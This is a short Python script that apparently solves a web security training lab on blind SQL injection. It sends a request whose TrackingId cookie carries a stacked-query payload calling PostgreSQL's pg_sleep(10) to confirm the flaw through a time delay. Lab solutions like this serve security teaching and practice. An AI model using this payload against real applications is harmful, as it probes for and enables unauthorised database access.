from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    get_tracking_id,
)


if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    tracking_id = get_tracking_id(lab_url)

    print("[!] Exploiting blind sql injection with a 10 second time delay....")

    SESSION.get(
        f"{lab_url}/",
        cookies={
            # NOTE: `%3B` is the URL encoded version of `;`
            "TrackingId": f"{tracking_id}'%3B SELECT pg_sleep(10) --"
        },
    )

    check_is_lab_solved(lab_url)
